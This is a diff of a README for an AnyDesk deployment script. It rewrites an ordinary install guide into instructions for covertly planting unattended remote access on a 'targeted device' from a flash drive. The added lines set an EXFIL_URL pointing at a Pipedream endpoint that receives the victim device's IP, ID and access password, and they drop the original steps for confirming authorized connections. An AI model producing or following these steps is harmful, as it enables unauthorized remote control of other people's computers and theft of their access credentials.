@@ -72,13 +72,13 @@ Before running the script, open `deploy.bat` in any text editor and update the f
 ::  REQUIRED CONFIGURATION — Update these before executing
 :: ─────────────────────────────────────────────────────────
 
-set DOWNLOAD_URL=https://download.anydesk.com/AnyDesk.exe
-set PASSWORD=YourHighlySecurePassword123!
+set "EXFIL_URL=[PUT_YOUR_PIPEDREAM_LINK_HERE]"
+set "PASSWORD=[PUT_YOUR_PASSWORD_HERE]"
 ```
 
 | Variable | Description | Example |
 |---|---|---|
-| `DOWNLOAD_URL` | Direct download URL for the AnyDesk executable | `https://download.anydesk.com/AnyDesk.exe` |
+| `EXFIL_URL` | Your pipdream link to view and verify `IPs` and `Passwords` of the recently deployed device  | `https://pipedream.com` |
 | `PASSWORD` | Password for unattended/headless access | `MyStr0ng!Pass` |
 
 > [!TIP]
@@ -91,34 +91,31 @@ set PASSWORD=YourHighlySecurePassword123!
 ### 1. Clone the Repository
 
 ```bash
-git clone https://github.com/yourusername/anydesk-deploy.git
+git clone https://github.com/MFimix/anydesk-deploy.git
 cd anydesk-deploy
 ```
 
 ### 2. Configure the Script
 
-Open `deploy.bat` and fill in your values:
+Open `DEPLOY.bat` and fill in your values:
 
 ```batch
-set DOWNLOAD_URL=https://download.anydesk.com/AnyDesk.exe
-set PASSWORD=YourSecurePassword
+set "EXFIL_URL=[PUT_YOUR_PIPEDREAM_LINK_HERE]"
+set "PASSWORD=[PUT_YOUR_PASSWORD_HERE]"
 ```
+### 3. Put the files on the flash drive
 
-### 3. Run as Administrator
+Put the configured `DEPLOY.bat` file on the flash drive or the dedicated folder on it, and add `Client_IDs.txt` and `AnyDesk.exe` to the same directory.
+
+### 4. Run as Administrator on the targeted device.
 
 > Administrative privileges are required to modify system services and installation directories.
 
-Right-click `deploy.bat` → **Run as administrator**
+Right-click `DEPLOY.bat` → **Run as administrator**
 
-### 4. Verify the Deployment
+### 5. Verify the Deployment
 
-Once complete, confirm everything is working:
-
-- [ ] Launch AnyDesk — a unique **Device ID** should be visible
-- [ ] Establish a test connection from a separate authorized device
-- [ ] Confirm unattended access responds (if configured)
-
----
+Once complete, confirm that the ID and the password of the device appeared on PipeDream.
 
 ## 🛠️ Advanced Customization
 
